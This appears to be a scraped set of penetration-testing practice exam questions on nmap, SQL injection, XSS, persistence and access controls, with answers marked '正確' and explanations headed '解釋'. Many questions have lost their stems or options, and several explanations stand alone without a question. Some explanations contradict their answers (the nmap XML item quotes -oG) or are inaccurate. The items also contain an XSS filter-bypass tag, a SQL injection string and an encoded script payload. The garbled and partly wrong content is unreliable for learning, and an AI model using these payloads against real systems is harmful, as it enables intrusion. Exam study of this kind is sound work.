Your team is developing an update to a piece of code that allows customers to update their billing and shipping addresses in the web application. The shipping address field used in the database was designed with a limit of 75 characters. Your team's web programmer has brought you some algorithms that may help prevent an attacker from trying to conduct a buffer overflow attack by submitting invalid input to the shipping address field. Which pseudo-code represents the best solution to prevent this issue?

- 

  if (shippingAddress = 75) {update field} else exit

- 

  if (shippingAddress >= 75) {update field} else exit

- 

  if (shippingAddress <= 75) {update field} else exit

  (正確)

- 

  if (shippingAddress != 75) {update field} else exit

#### 解釋

OBJ-5.2: To ensure that the field is not overrun by an input that is too long, input validation must occur. Checking if the shipping address is less than or equal to 75 characters before updating the field will prevent a buffer overflow from occurring in this program. If the input is 76 characters or more, then the field will not be updated, and the algorithm will exit the function.

Which file on a Linux system contains the passwords for each user on the system?

- 

  /etc/users

- 

  /etc/password

- 

  /etc/shadow

  (正確)

- 

  /etc/passwd

#### 解釋

OBJ-3.1: The /etc/shadow file stores the actual password in an encrypted format (more like the hash of the password) for the user’s account with additional properties related to the user password. Basically, it stores secure user account information. All fields are separated by a colon (:) symbol. It contains one entry per line for each user listed in /etc/passwd file.

Which of the following information is traditionally found in the Scope of Work (SOW) for a penetration test?

- 

  Maintenance windows

- 

  Excluded hosts

  (正確)

- 

  Format of the executive summary report

- 

  Timing of the scan

#### 解釋

OBJ-1.2: A Scope of Work (SOW) for a penetration test normally contains the list of excluded hosts. This ensures that the penetration tester does not affect hosts, workstations, or servers outside the assessment scope. The timing of the scan and the maintenance windows are usually found in the rules of engagement (ROE). The executive summary report contents are usually not identified in any of the scoping documents, only the requirement of whether such a report is to be delivered at the end of the assessment.

A facility would like to verify each individual's identity before allowing access to its server room and data center. Additionally, the building should ensure that users do not tailgate behind other users. What solution would BEST meet these requirements?

- 

  Implement a biometric reader at the datacenter entrance and require passage through an access control vestibule

  (正確)

- 

  Implement a security guard at the facility entrance and a keypad at the data center entrance

- 

  Implement a biometric reader at the facility entrance and a proximity card at the data center entrance

- 

  Implement a CCTV camera and a proximity reader at the data center entrance

#### 解釋

OBJ-4.2: A biometric reader would read the employee's fingerprints, retina, or facial features. An access control vestibule (formerly called a mantrap) is most often used in physical security to separate non-secure areas from secure areas and prevent unauthorized access. Combining these two would ensure the identity of the individual and that only one person could enter at a time.

Dion Training hosts its new web applications on AWS Lambda. You have been contracted to perform a penetration test against this new web application. What target type would this engagement be classified as?

- 

  Internal

- 

  Third-party hosted

  (正確)

- 

  On-site

- 

  First-party hosted

#### 解釋

OBJ-1.2: Third-party hosted target types are used when a vendor or partner of the client organization hosts the targeted network or system. In this scenario, Dion Training uses AWS Lambda for hosting its web application. Therefore, this is classified as a third-party hosted target type. This is important to consider before beginning the assessment since the third-party also must consent and agree to the penetration test since they host the systems involved. First-party hosted targets are assets hosted by the client organization themselves. An internal target type means that assets can be accessed from within the organization. This can either be physically or logically from within the network, and it best simulates an insider threat. This target type can also be used to simulate an external hacker who has gained credentials on the network, such as using a spear phishing attack. On-site targets are those that are first-party hosted in the organization's own data center.

You are working as part of a penetration testing team during an engagement. A coworker just entered "Get-Service -DisplayName "Dion Training App" | Remove-Service" in PowerShell on the Windows server the team exploited. What action is your coworker performing with this command?

- 

  To enumerate the running services on the server

- 

  To enable persistence on the server

- 

  To remove persistence on the server

  (正確)

- 

  To shutdown the running service on the server

#### 解釋

OBJ-4.4: This scenario is using a chained command to remove persistence from a Windows server using PowerShell. The command entered removes a service named Dion Training App. The command uses Get-Service to get an object representing the Dion Training App service using the display name. The pipeline operator (|) pipes the object to Remove-Service, which removes the service. This will remove any persistence gained by running the Dion Training App, which is just a fictional service name used in this example to hide the penetration tester's persistence tools. This service could be named anything the penetration tester deems appropriate during the service's installation.

Dion Training has applied a new Group Policy to all student accounts that will lock out any account in which the student enters their password incorrectly 3 times in a row. Once the account is locked out, the student must wait 15 minutes before they can attempt to log in again. What type of attack is this mitigation strategy trying to prevent?

- 

  Brute force attack

  (正確)

- 

  Spoofing

- 

  Privilege escalation

- 

  On-path attack

#### 解釋

OBJ-4.2: Since the policy will lock out the student for 15 minutes between attempts, it is a valid mitigation technique against a brute force attack. By extending the waiting period, the attacker's brute force attempts are less effective. A brute force attack is a type of password attack where an attacker uses an application to exhaustively try every possible alphanumeric combination to crack encrypted passwords. An on-path attack is an attack where the threat actor makes an independent connection between two victims and can read, and possibly modify traffic. A privilege escalation is a practice of exploiting flaws in an operating system or other application to gain a greater level of access than was intended for the user or application. Spoofing is a type of attack that disguises a communication from an unknown source as being from a known, trusted source. Spoofing can occur using different methods, such as MAC spoofing, IP spoofing, call spoofing, and others.

You are conducting a penetration test and planning to use a cross-site scripting attack. During your reconnaissance, you determined that the system performs input validation using REGEX to prevent any strings that contain the term "[Ss][Cc][Rr][Ii][Pp][Tt]" in the input. To bypass this input validation, which of the following variations of the script tag should you utilize?

- 

  <SCRIPT>

- 

  <$cript>

- 

  <%53CRIPT>

  (正確)

- 

  <script>

#### 解釋

OBJ-3.3: Since cross-site scripting (XSS) relies on the <script> and </script> HTML tags to launch, the system administrators had a good idea of creating input validation using a REGEX for those keywords. Unfortunately, they forgot to include a more inclusive version of this REGEX to catch all variants. For example, simply using [Ss][Cc][Rr][Ii][Pp][Tt] would have been much more secure, but even this would miss %53CRIPT would evade this filter. To catch all the letter S variants, you would need to use [%53%%73Ss], which includes the capital S in hex code, the lower case s in hex code, the capital S, and the lowercase s. As a penetration tester, it is important to remember that you can evade weak input validation using ASCII encoded characters, like %53 for the S character. As a cybersecurity analyst, you must build good input validations into your systems to prevent these types of attacks.

You have been researching WPA2 and just discovered a new vulnerability in its implementation in a popular SOHO access point. You have created a harmless exploit to demonstrate the vulnerability and published it to a cybersecurity blog. You did not provide the details of exactly how your exploit works but have told others they need to update their access point's firmware to version 10.2 to mitigate this vulnerability. Which of the following techniques did you use in this scenario?

- 

  Proof of concept

  (正確)

- 

  Cross-compiling code

- 

  Exploit chaining

- 

  Exploit modification

#### 解釋

OBJ-3.5: In this scenario, the only one of these techniques we know was used for certain is a proof of concept. A proof of concept is a benign exploit developed to highlight vulnerabilities in a system or product. Usually, a proof of concept is developed by security researchers to demonstrate a flaw of vulnerability in a widely used system, software, hardware, or protocol. The technical details may not be initially published until the researcher can provide the information to the companies affected, and they can release a patch. Other times, the security researchers will provide all the details in their security blogs so that both defenders and attackers know the exploit's details.

OBJ-2.1: Service (SRV) records are used to provide host and port information on services such as voice over IP (VoIP) and instant messaging (IM) applications. Mail Exchange (MX) records are used to provide the mail server that accepts email messages for a particular domain. Nameserver (NS) records are used to list the authoritative DNS server for a particular domain. Text (TXT) records are used to provide information about a resource such as a server, network, or service in human-readable form. They often contain domain verification and domain authentications for third-party tools that can send information on behalf of a domain name.

- 

  Key-value pair

- 

  Array

- 

  CSV

  (正確)

- 

  JSON

#### 解釋

OBJ-5.1: A comma-separated value (CSV) file is a file where entries are separated by commas. CSV files were originally used as an export from spreadsheets but have since become a very popular way to import and export data. A key-value pair is made of a key name and a value of that key separated by a colon(:), such as type:intrusion-set. An array is a data structure consisting of a collection of elements, each identified by at least one array index or key. JSON is an open standard data encoding format of data representation that can be used and manipulated easily with scripts. It is designed to be human-readable and machine-processable. It is based on JavaScript concepts but is entirely script and language-independent.

  -T1

- 

  -T4

- 

  -T5

  (正確)

#### 解釋

OBJ-2.4: -T5 is the fastest scanning option but can be unable if either your network or the target network’s speed cannot maintain the timing. -T0 and -T1 are the best options for evading an intrusion detection system, but they are extremely slow to conduct the scan. -T2 slows the scan to conserve bandwidth. -T3 is the default and most stable scanning timing option. -T4 is the recommended choice for a faster scan that is still relatively stable.

You are working as part of a penetration testing team conducting engagement against Dion Training's network. You have been given a list of targets to scan in nmap in a text file called servers.txt. Which of the following Nmap commands should you use to find all the servers from the list with ports 80 and 443 enabled and save the results in an XML formatted file called results.txt for importing into your team's report generation software?

- 

  nmap -p80,443 -sL servers.txt -oX results.txt

- 

  nmap -p80,443 -iL servers.txt -oG results.txt

- 

  nmap -p80,443 -sL servers.txt -oG results.txt

- 

  nmap -p80,443 -iL servers.txt -oX results.txt

  (正確)

#### 解釋

OBJ-2.4: The command (nmap -p80,443 -iL servers.txt -oG results.txt) will only perform a nmap scan against ports 80 and 443. The -iL option will scan each of the listed server's IP addresses. The -oX option will save the results in an XML format to the file results.txt while still displaying the normal results to the shell. The option of -sL will only list the servers to scan, but it will not scan them. The option of -oG is for outputting the results to a file in a greppable format.

  Stress testing

- 

  User acceptance testing

- 

  Fuzzing

  (正確)

- 

  Security regression testing

#### 解釋

OBJ-4.2: Fuzzing or fuzz testing is an automated software testing technique that involves providing invalid, unexpected, or random data as inputs to a computer program. The program is then monitored for exceptions such as crashes, failing built-in code assertions, or potential memory leaks. User Acceptance Testing is the process of verifying that a created solution/software works for the user. Security regression testing ensures that changes made to a system do not harm its security, are therefore of high significance, and the interest in such approaches has steadily increased. Stress testing verifies the system's stability and reliability by measuring its robustness and error handling capabilities under heavy load conditions.

- 

  A malicious inbound TCP packet

  (正確)

- 

  A malicious outbound TCP packet

- 

  Any malicious inbound packets

- 

  Any malicious outbound packets

#### 解釋

OBJ-2.2: The rule header is set to alert only on TCP packets based on this IDS rule's first line. The flow condition is set as "to_client,established," which means that only inbound traffic will be analyzed against this rule and only inbound traffic for connections that are already established. Therefore, this rule will alert on an inbound malicious TCP packet only when the packet matches all the conditions listed in this rule. This rule is an example of a Snort IDS rule. For the exam, you do not need to create your own IDS rules, but you should be able to read them and pick out generic content like the type of protocol covered by the signature, the port to be analyzed, and the direction of flow.

If an attacker can compromise an Active Directory domain by utilizing an attack to grant administrative access to the domain controllers for all domain members, which type of attack is being used?

- 

  Golden ticket

  (正確)

- 

  Pass the hash

- 

  Pivoting

- 

  Lateral movement

#### 解釋

OBJ-3.7: A golden ticket is a Kerberos ticket that can grant other tickets in an Active Directory environment. Attackers who can create a golden ticket can use it to grant administrative access to other domain members, even to domain controllers. Pass the Hash (PtH) is the process of harvesting an account's cached credentials when the user logs in to a single sign-on (SSO) system. This would then allow the attacker to use the credentials on other systems, as well. Lateral movement is an umbrella term for a variety of attack types. Attackers can extend their lateral movement by a great deal if they can compromise host credentials. Pivoting is a process similar to lateral movement. When attackers pivot, they compromise one central host (the pivot) that allows them to spread out to other hosts that would otherwise be inaccessible.

  (正確)

- 

  ping 172.16.0.255

#### 解釋

OBJ-5.2: The Windows command line does support some fundamental scripting, as shown in this answer. Use an iterative variable to set the starting value (start#) and then step through a set range of values until the value exceeds the set ending value (end#). /L will execute the iterative by comparing start# with end#. If start# is less than end#, the command will execute. When the iterative variable exceeds end#, the command shell exits the loop. You can also use a negative step# to step through a range in decreasing values. For example, (1,1,5) generates the sequence 1 2 3 4 5 and (5,-1,1) generates the sequence (5 4 3 2 1). The syntax is: "for /L %variable in (start# step# end#) do command [CommandLineOptions]."

Which of the following vulnerabilities exist in this application's authentication function based solely on the source code provided?

- 

  The function is vulnerable to a buffer overflow attack

- 

  The function is using hard-coded credentials to verify the password entered by the user

  (正確)

- 

  The function is using parameterized queries

- 

  The function is vulnerable to an SQL injection attack

#### 解釋

OBJ-5.1: The function uses hard-coded credentials in the function, which is an insecure practice that can lead to compromise. The password for the application is shown in the source code as mR7HCS14@31&#. Even if this was obfuscated using encoding or encryption, it is a terrible security practice to include hard-coded credentials in the application since an attacker can reverse-engineer them. In this case, it could be used to rob the bank or its customers! There is no evidence of a SQL injection or buffer overflow attack vulnerability based on the code being shown since this code doesn't even show any SQL or ability to connect to an SQL database. We cannot see the variable initiation in this code, either, so we cannot determine if it is vulnerable to a buffer overflow attack. Finally, a parameterized query is a security feature, not a vulnerability, and this source code does not show any evidence of parameterized queries being used.

What is the issue with the largest security issue with this line of code?

- 

  This code is vulnerable to a buffer overflow attack

- 

  The * operator will allow retrieval of every data field about this customer in the CUSTOMER table

- 

  The code is using parameterized queries

- 

  An SQL injection could occur because input validation is not being used on the id parameter

  (正確)

#### 解釋

OBJ-4.2: This code takes the input of “id” directly from a user or other program without conducting any input validation. This could be exploited and used as an attack vector for an SQL injection. If a malicious user can alter the ID source, it might get replaced with something like’ or ‘1’ ='1. This will cause the SQL statement to become: "SELECT * FROM CUSTOMER WHERE CUST_ID='' or '1'='1'". Because ‘1’ always equals ‘1’, the where clause will always return ‘true,’ meaning that EVERY record in the database could now become available to the attacker. When creating SQL statements, there are reasons for and against the use of the * operator. Its presence alone does not necessarily indicate a weakness. With only one line of code being reviewed, you cannot make any statement about whether it is vulnerable to a buffer overflow attack. You do not see the declaration values for the initialization of the id variable. This code is not using parameterized queries, but if it did, then it would eliminate this vulnerability. A parameterized query is a type of output encoding that relies on prepared statements to reduce the risk of an SQL injection.

A penetration tester was able to gain access to your organization's network closet while posing as an HVAC technician. While he was there, he installed a network sniffer in your switched network environment. The penetration tester now wants to sniff all of the packets in the network. What attack should he use?

- 

  Tear Drop

- 

  Fraggle

- 

  Smurf

- 

  MAC Flood

  (正確)

#### 解釋

OBJ-3.1: MAC flooding is a technique employed to compromise the security of switched network devices. The attack forces legitimate MAC addresses out of the CAM table in the switch and forces a unicast flooding behavior, potentially sending sensitive information to portions of the network where it is not normally intended to go. Essentially, since the switch table of contents is flooding with bad information, the switch could fail open and begin to act like a hub, broadcasting all the frames out of every port. This would allow the attacker to sniff all network packets since he is connected to one of those switch ports. A fraggle attack is a denial-of-service (DoS) attack that involves sending a large amount of spoofed UDP traffic to a router's broadcast address within a network. A teardrop attack is a denial-of-service (DoS) attack that involves sending fragmented TCP packets to a target machine. The Smurf attack is a distributed denial-of-service attack. Large numbers of Internet Control Message Protocol (ICMP) packets with the intended victim's spoofed source IP are broadcast to a computer network using an IP broadcast address.

#### 解釋

OBJ-5.1: JSON is an open standard data encoding format of data representation that can be used and manipulated easily with scripts. It is designed to be human-readable and machine-processable. It is based on JavaScript concepts but is entirely script and language-independent. This excerpt is a JSON object used by the STIX protocol to convey threat information. STIX (Structured Threat Information eXpression) is a standardized XML programming language for conveying data about cybersecurity threats in a common language that can be easily understood by humans and security technologies. A comma-separated value (CSV) file is a file where entries are separated by commas. CSV files were originally used as an export from spreadsheets but have since become a very popular way to import and export data. A key-value pair is made of a key name and a value of that key separated by a colon(:), such as type:intrusion-set. An array is a data structure consisting of a collection of elements, each identified by at least one array index or key.

You are a cybersecurity analyst, and your company has just enabled key-based authentication on its SSH server. Review the following log file:

![img](https://img-c.udemycdn.com/redactor/raw/quiz_question/2022-01-17_05-21-53-d1eab6aa6523d1f84c2e878271892a7e.png)

Which of the following actions should be performed to secure the SSH server?

- 

  Disable anonymous SSH logon

- 

  Disable password authentication for SSH

  (正確)

- 

  Disable SSHv1

- 

  Disable remote root SSH logon

#### 解釋

OBJ-4.2: It is common for attackers to log in remotely using the ssh service and the root or other user accounts. The best way to protect your server is to disable password authentication over ssh. Since your company just enabled key-based authentication on the SSH server, all legitimate users should be logging in using their RSA key pair on their client machines, not usernames and passwords. Based on the logs, you see the server runs SSHv2, so there is no need to disable SSHv1 (it may already be disabled). You don't want to fully disable remote root SSH logins, either, since this would make it difficult for administrators to conduct their work. Finally, based on the logs, it doesn't appear that anonymous SSH logins are an issue, either, as we don't see any anonymous attempts in the logs.

During a penetration test, which of the following should you perform if your goal is to conduct a successful whaling attack?

- 

  Send a targeted email with a malicious attachment to the organization's CEO

  (正確)

- 

  Send a text message with a malicious link to the organization's executives

- 

  Send targeted emails with a malicious attachment to the sales team

- 

  Call the CTO's assistant using a pretext to gather information about their schedule

#### 解釋

OBJ-3.6: Whaling is an email-based or web-based form of phishing that targets senior executives or wealthy individuals. Smishing (SMS phishing) is a phishing attack in which the attacker entices their victim through SMS text messages. If the messages are sent by text message, then the attack is considered smishing. Spear phishing is the fraudulent practice of sending emails from a seemingly known or trusted sender to induce targeted individuals to reveal confidential information. Spear phishing attacks focus on a targeted set of people, not just an indiscriminate large group of random people. Pretexting is a social engineering tactic where a team will communicate, whether directly or indirectly, a lie or half-truth to get someone to believe a falsehood.

A network technician is using telnet to connect to a router on a network that has been compromised. A new user and password have been added to the router with full rights. The technician is concerned that the regularly used administrator account has been compromised. After changing the password on all the networking devices, which of the following should the technician do to prevent the password from being sniffed on the network again?

- 

  Ensure the password is 10 characters, containing letters and numbers

- 

  Use SNMPv1 for all configurations involving the router

- 

  Only allow administrators to access routers using port 22

  (正確)

- 

  Copy all configurations to routers using TFTP for security

#### 解釋

OBJ-4.2: Port 22 uses SSH to authenticate a remote computer or user, or in this case, an administrator. Even if the router has been compromised, the new full rights user will not access their new account without the SSH key, which could only be provided by a true administrator. Telnet uses port 23 and passes all information as unencrypted traffic on the network. Telnet should always be disabled for security reasons, and SSH (which uses encryption) should be used instead.

Riaan's company runs critical web applications. During a vulnerability scan, Riaan found a serious SQL injection vulnerability in one of their web applications. The system cannot be taken offline to remediate the vulnerability. Which of the following compensating controls should Riaan recommend using until the system can be remediated?

- 

  IPS

- 

  Encryption

- 

  WAF

  (正確)

- 

  Vulnerability scanning

#### 解釋

OBJ-4.2: WAF (web application firewall) is the best option since it can serve as a compensating control and protect against web application vulnerabilities like an SQL injection until the application can be fully remediated. Vulnerability scanning could only be used to detect the issue. Therefore, it is a detective control, not a compensating control. Encryption would not be effective in stopping an SQL injection. An intrusion prevention system (IPS) is designed to protect network devices based on ports, protocols, and signatures. It would not be effective against an SQL injection and is not considered a compensating control for this vulnerability.

During a penetration test, you enter the following command: 

![img](https://img-c.udemycdn.com/redactor/raw/quiz_question/2022-01-17_05-26-14-ebe29dda646025fcc4522e0e5af05794.png)

What actions will be performed by this command?

- 

  A stealth scan that scans all open ports excluding ports 80 to 443

- 

  A stealth scan that scans ports 80 to 443

- 

  A stealth scan that scans ports 80 and 443

- 

  A stealth scan that scans all ports from 80 to 443 and determines a target's operating system

  (正確)

#### 解釋

OBJ-2.4: When using NMAP, the -sS tells the tool to use a stealth scan using a TCP SYN packet, the -O is used to determine the operating system, and -p dictates which ports to scan. Since the ports were listed as 80-443, this indicates it includes all the ports from 80 through 443.

Which of the following tools provides a penetration tester with the ability to mask their identity and source IP address by sending messages through intermediaries?

- 

  ProxyChains

  (正確)

- 

  Powersploit

- 

  Responder

- 

  Empire

#### 解釋

OBJ-5.3: ProxyChains is a command-line tool that enables pen testers to mask their identity and/or source IP address by sending messages through intermediary or proxy servers. Empire (PowerShell Empire) is a post-exploitation framework for Windows devices that allows the attacker to run PowerShell agents without needing powershell.exe. It is commonly used to escalate privileges, launch other modules to capture data, extract passwords, and install persistent backdoors. Powersploit is a series of Microsoft PowerShell scripts that pen testers can use in post-exploit scenarios. Responder is a fake server and relay tool that is included with Kali Linux. It responds to LLMNR, NBT-NS, POP, IMAP, SMTP, and SQL queries to possibly recover sensitive information such as user names and passwords.

You are conducting a quick nmap scan of a target network. You want to conduct an SYN scan, but you don't have raw socket privileges on your workstation. Which of the following commands should you use to conduct the SYN scan from your workstation?

- 

  nmap -sT

  (正確)

- 

  nmap -O

- 

  nmap -sS

- 

  nmap -sX

#### 解釋

OBJ-2.4: The nmap TCP connect scan (-sT) is used when the SYN scan (-sS) is not an option. You should use the -sT flag when you d not have raw packet privileges on your workstation or if you are scanning an IPv6 network. This flag tells nmap to establish a connection with the target machine by issuing the connect system call instead of directly using an SYN scan. Normally, a fast scan using the -sS (SYN scan) flag is more often conducted, but it requires raw socket access on the scanning workstation. The -sX flag would conduct a Xmas scan where the FIN, PSH, and URG flags are used in the scan. The -O flag would conduct an operating system detection scan of the target system.

A cybersecurity analyst is preparing to run a vulnerability scan on a dedicated Apache server that will be moved into a DMZ. Which of the following vulnerability scans is most likely to provide valuable information to the analyst?

- 

  Web application vulnerability scan

  (正確)

- 

  Database vulnerability scan

- 

  Port scan

- 

  Network vulnerability scan

#### 解釋

OBJ-2.4: Since Apache is being run on the scanned server, this indicates a web server. Therefore, a web application vulnerability scan would be the most likely to provide valuable information. A network vulnerability scan or port scan can provide valuable information against any network-enabled server. Since an Apache server doesn’t contain a database by default, running a database vulnerability scan is not likely to provide any valuable information to the analyst.

What is the term for exploiting a weakness in a user's wireless headset to compromise their smartphone?

- 

  Multiplexing

- 

  Bluejacking

  (正確)

- 

  Zero-day attack

- 

  Smurfing

#### 解釋

OBJ-3.2: Bluejacking is the sending of unsolicited messages over Bluetooth to Bluetooth-enabled devices such as mobile phones, PDAs, or laptop computers, sending a vCard which typically contains a message in the name field to another Bluetooth-enabled device via the OBEX protocol. A zero-day attack happens once that flaw, or software/hardware vulnerability, is exploited and attackers release malware before a developer has an opportunity to create a patch to fix the vulnerability. The Smurf attack is a distributed denial-of-service attack in which large numbers of Internet Control Message Protocol packets with the intended victim's spoofed source IP are broadcast to a computer network using an IP broadcast address. Multiplexing is a method by which multiple analog or digital signals are combined into one signal over a shared medium to share a scarce resource. Multiplexing is not a type of exploit or attack but is heavily used to increase the bandwidth of wireless networks and fiber optic connections.

You are working as part of a penetration testing team during an engagement. A coworker just entered "sudo systemctl stop DionTrainingApp" in the shell of a Linux server the team exploited. What action is your coworker performing with this command?

- 

  To remove tester-created credentials

- 

  To remove persistence on the server

  (正確)

- 

  To enable persistence on the server

- 

  To enumerate the running services on the server

#### 解釋

OBJ-4.4: This scenario uses the systemctl command to remove persistence from a Linux server within its shell. The systemd tool is an init system and system manager that has widely become the new standard for Linux distributions. The systemctl is part of systemd. The systemctl is used to manage services, check their status, change their status, and work with the configuration files. By entering "sudo systemctrl stop DionTrainingApp" in the shell, the system will stop the service known as DionTrainingApp. This will remove any persistence gained by running the DionTrainingApp service, which is just a fictional service name used in this example to hide the penetration tester's persistence tools. This service could be named anything the penetration tester deems appropriate during the service's installation.

  Androzer

- 

  Nikto

- 

  Metasploit

  (正確)

- 

  Nessus

#### 解釋

OBJ-5.3: Metasploit is an open-source exploitation framework that uses plugins to add different exploits and functionalities. They are always in the form of a directory structure, like /exploit/windows/scada/daq_factory_bof. This represents the plugin type (exploit), the operating system involved (windows), the service/program (scada), and the specific exploit (daq_factory_bof). If you see this format in a question, the answer is most likely related to Metasploit.

You are conducting a penetration test and performing active reconnaissance. You have configured your tool to send one SYN packet to each port on the targeted web server from 1 to 1024. Which of the following are you performing?

- 

  SYN flood

- 

  UDP probing

- 

  Port scan

  (正確)

- 

  Web crawling

#### 解釋

OBJ-2.2: Based on the description provided, the penetration test is most likely conducting a port scan. Using a tool like Nmap, a penetration tester can create an SYN scan across every port in a specified range against the desired target. A port scan or SYN scan may trigger an alert in the target organization’s IDS, though, so it is not the stealthiest method of reconnaissance. While scanners support more stealthy scans, a default port scan will connect to each port sequentially. SYN floods normally send many SYN packets to a single system to cause a denial of service, therefore it is the wrong answer. A UDP probe would use UDP packets to probe the web server, not SYN packets. Web crawling is a technique that attempts to connect to each webpage on a web server, but this is done on port 80 or 443 only.

You are currently conducting passive reconnaissance in preparation for an upcoming penetration test against Dion Training. You have just read an article on a security blog that described a new VoIP vulnerability and matching exploit that has been released. Which of the following DNS records could you use to find potential VoIP targets for your upcoming engagement?

- 

  SRV

  (正確)

- 

  NS

- 

  MX

- 

  TXT

#### 解釋

OBJ-2.1: Service (SRV) records are used to provide host and port information on services such as voice over IP (VoIP) and instant messaging (IM) applications. Mail Exchange (MX) records are used to provide the mail server that accepts email messages for a particular domain. Nameserver (NS) records are used to list the authoritative DNS server for a particular domain. Text (TXT) records are used to provide information about a resource such as a server, network, or service in human-readable form. They often contain domain verification and domain authentications for third-party tools that can send information on behalf of a domain name.

You are planning an engagement with a new client. The organization is hosting a domain controller and a web server in its on-premise data center. The domain controller is only accessible to those directly connected to the organization’s intranet, but the webserver is located in a screened subnet that is accessible from the Internet. Which target types BEST described these two servers?

- 

  Third-party hosted

- 

  External

- 

  First-party hosted

  (正確)

- 

  Internal

#### 解釋

OBJ-1.2: A first-party hosted target type best describes these targets since the question includes both internal (domain controller) and external (webserver) assets as part of the target scope, but both are hosted by the organization itself. First-party hosted targets are assets hosted by the client organization themselves. Third-party hosted targets are assets hosted by a vendor, partner, or cloud service provider. An external target type is an asset that can be accessed from outside of the organization. For example, if the webserver is visible on the Internet, it is considered an external target. An internal target type means that assets can be accessed from within the organization. This can either be physically or logically from within the network, and it best simulates an insider threat. This target type can also be used to simulate an external hacker who has gained credentials on the network, such as using a spear phishing attack.

- 

  Tolerance to impact

  (正確)

- 

  Key management policies

- 

  Storage time for a report

#### 解釋

OBJ-1.2: The client's tolerance to impact will allow the penetration test to balance the tasks to be performed in the assessment against real-world network utilization. If the client has a low tolerance to impact, then the assessment may be conducted on a cloned or a sandboxed version of the network or its applications. If the client has a high tolerance to impact, then they understand and agree that the penetration test may have real-world consequences to the production network during the assessment. This is usually based on the organization's risk appetite.

What is the BEST explanation for why consumer-based IoT devices are less secure than traditional desktops and servers?

- 

  IoT devices focus on convenience more than security

  (正確)

- 

  IoT devices are only used in low-security use cases

- 

  IoT devices are unable to receive patches and updates

- 

  IoT devices are not powerful enough to support encryption

#### 解釋

OBJ-3.5: IoT device manufacturers are more focused on making the devices convenient to use instead of ensuring they have strong security. The other options are incorrect and not true. IoT devices can receive patches and updates through an over-the-air firmware update if a manufacturer creates the patches. IoT devices are powerful these days, and they can support encryption and other security features if manufacturers would add them to their code. IoT devices are not just used in low-security use cases, either. For example, IoT devices are often used as life-saving devices in hospitals or security systems in our homes. Unfortunately, IoT devices are notoriously lax when it comes to security. Some IoT systems may even allow a user full remote control of a device.

  False positive

  (正確)

- 

  True negative

- 

  False negative

#### 解釋

OBJ-2.4: You should categorize the results as a false positive. Based on the scenario and output, your server is not vulnerable to a remote code execution for the identified vulnerability. You are already running MySQL v3.5.3 that is greater than v3.3.x or above. This indicates that the vulnerability scanner falsely identified your MySQL version as an earlier and more vulnerable version. The system incorrectly identified a vulnerability, but the vulnerability doesn’t exist on your system. Therefore this is a false positive.

#### 解釋

OBJ-4.2: Two-factor authentication (also known as 2FA) is a method of confirming a user's claimed identity by using a combination of two different factors: (1) something you know, (2) something you have, or (3) something you are. Out of the options provided, only a key fob (something you have) and a password (something you know) meet the requirements of 2FA. If you have two factors from the same type/category, like something you know (username and password), this is only considered a single factor of authentication.

  XML denial of service

  (正確)

- 

  Xpath injection

- 

  Cross-site scripting

- 

  SQL injection

#### 解釋

OBJ-3.3: An XML denial of service (or XML bomb) attempts to pull in entities recursively in a defined DTD and explode the amount of memory used by the system until a denial of service condition occurs. Service-Oriented Architecture (SOA) is an architectural paradigm, and it aims to achieve a loose coupling amongst interacting distributed systems. SOA is used by enterprises to efficiently and cost-effectively integrate heterogeneous systems. However, SOA is affected by several security vulnerabilities, affecting the speed of its deployment in organizations. SOA is most commonly vulnerable to an XML denial of service. While the other options could be used as part of an attack on SOAP, the SOAP message itself is formatted as an XML document making an XML denial of service the most common vulnerability. While SOAP requests are vulnerable to SQL injections, this occurs by submitting a parameter as a morphed SQL query that can authenticate or reveal sensitive information as an attack on the underlying SQL. Cross-Site Scripting (XSS) attacks are a type of injection in which malicious scripts are injected into otherwise benign and trusted websites. XPath Injections operate on websites that use user-supplied information to construct an XPath query for XML data.

Which of the following is the biggest weakness with ICS and SCADA systems in a network?

- 

  They are patched using standard vendor OS patches

- 

  ICS/SCADA must be connected to the internet to function

- 

  Cybersecurity experts don't know how to secure ICS/SCADA

- 

  These systems are difficult to retrofit with modern security

  (正確)

#### 解釋

OBJ-3.5: Industrial control system (ICS) and supervisory control and data acquisition (SCADA) systems were developed many years before security standards were established and integrated into their design. Many of these older systems date back to the 1970s and are still in use today. Over time, these systems were incorporated into the organization's TCP/IP data networks, which provides a huge exploitation area by penetration testers and attackers alike. Many ICS and SCADA vendors are slow to implement security measures since they cannot be easily retrofitted with the newer security required. Therefore, ICS and SCADA systems should ALWAYS be isolated from production networks and segmented into their logical network. For example, some ICS/SCADA systems use a proprietary operating system. More modern ICS/SCADA operates using a version of Windows. However, many still use Windows XP, making them much more vulnerable since they cannot be upgraded to Windows 10 without hardware replacement.

- 

  XML injection

- 

  Password spraying

- 

  SQL injection

#### 解釋

OBJ-3.3: This is an example of a URL-based XSS (cross-site scripting) attack. A cross-site scripting attack uses a specially crafted URL that includes attack code that will cause information that users enter into their web browser to be sent to the attacker. In this example, everything from ?param onward is part of the attack. You can see the base64 encoded string of PHNjcmlwdD5hbGVydCgnSSBsb3ZlIERpb24gVHJhaW5pbmcnKTwvc2NyaXB0Pg== being used. While you could not convert it during the exam without a base64 decoder, you should be able to tell that it is not a SQL injection nor an XML injection based on your studies. It is also not an attempt to conduct password spraying by logging into different usernames with the same password. So, by process of elimination, you can determine this is an XSS attack. If you did have a base64 decoder, you would have found that the parameter being passed would translate to <script>alert('I love Dion Training')</script>, which is a simple method to cause your web browser to create a popup that displays the text "I love Dion Training." If you attempt to load this URL in your browser, it may or may not function depending on your browser's security.

  FTP exploit

- 

  LLMNR exploit

  (正確)

- 

  DNS cache poisoning

- 

  Pass the hash attack

#### 解釋

